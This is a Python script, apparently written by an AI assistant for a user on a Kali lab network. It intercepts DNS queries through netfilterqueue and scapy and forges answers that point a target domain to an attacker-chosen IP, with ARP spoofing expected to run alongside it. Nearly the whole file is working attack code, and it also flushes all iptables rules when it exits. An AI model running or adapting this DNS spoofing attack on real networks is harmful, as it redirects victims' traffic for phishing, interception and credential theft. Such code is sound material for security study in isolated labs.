#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import os
import sys

# Define the IP address to which the target domain will resolve.
# This should be YOUR Kali machine's IP (or the IP of your spoofed server).
# Based on your previous screenshots, your Kali IP is 192.168.72.111.
# The user's target IP (where bing was spoofed) was 192.168.72.176.
# I will use 192.168.72.176 as the spoofing IP, assuming that's the web server
# you want the victim to be directed to.
SPOOF_IP = "192.168.72.176"
TARGET_DOMAIN = b"www.httpforever"  # Note: Do NOT include http:// or a trailing slash


def process_packet(packet):
    # Get the raw packet payload and convert it to a Scapy IP packet
    scapy_packet = scapy.IP(packet.get_payload())

    # 1. Check if the packet contains a DNS Query Record
    if scapy_packet.haslayer(scapy.DNSQR):
        # Extract the queried domain name (qname). It ends with a dot/period.
        qname = scapy_packet[scapy.DNSQR].qname

        # The check needs to be adjusted.
        # DNS queries for "httpforever.com" come as b"httpforever.com."
        if TARGET_DOMAIN in qname:
            # We found the target query and are going to spoof the response
            print(f"[+] Spoofing target: {qname.decode()} -> {SPOOF_IP}")

            # --- 2. Construct the DNS Answer Record (DNSRR) ---
            # rrname: The domain name being answered (must match qname)
            # rdata: The IP address we want the domain to resolve to (SPOOF_IP)
            answer = scapy.DNSRR(rrname=qname, rdata=SPOOF_IP)

            # --- 3. Modify the DNS Header ---
            # Set the Answer Count (ancount) to 1 (because we added one answer)
            scapy_packet[scapy.DNS].ancount = 1
            # Set the Answer field (an) to our new answer
            scapy_packet[scapy.DNS].an = answer

            # Force the DNS response flags for a valid, non-recursive answer
            scapy_packet[scapy.DNS].qr = 1  # Query/Response flag: 1 (Response)
            scapy_packet[scapy.DNS].aa = 1  # Authoritative Answer flag: 1 (Yes)
            scapy_packet[scapy.DNS].rcode = 0  # Response code: 0 (No error)

            # --- 4. CRITICAL: Delete Checksums and Lengths ---
            # When you modify the payload, the IP and UDP headers are corrupted.
            # Deleting these fields forces Scapy to recalculate them when it rebuilds the packet.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # --- 5. Set the New Payload and Accept ---
            packet.set_payload(bytes(scapy_packet))  # Use bytes() for modern Scapy builds

    # CRITICAL: Always accept the packet. If the packet wasn't spoofed, it continues
    # normally. If it was spoofed, the modified packet continues.
    packet.accept()


# The function to ensure iptables rules are flushed on exit
def cleanup():
    print("\n[!] Exiting and flushing iptables rules...")
    # This command is safer than trying to delete specific rules
    os.system("sudo iptables --flush")
    sys.exit(0)


# Register cleanup function to run on Ctrl+C (SIGINT)
# signal.signal is not used here to keep imports minimal, rely on try/finally.

try:
    print(f"[*] Starting NFQUEUE listener. Spoofing {TARGET_DOMAIN.decode()} to {SPOOF_IP}")
    print("[*] NOTE: You must have IP Forwarding and ARP Spoofing running.")
    print("[*] Press Ctrl+C to stop and flush iptables.")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    pass
except Exception as e:
    print(f"[ERROR] An unexpected error occurred: {e}")
finally:
    cleanup()
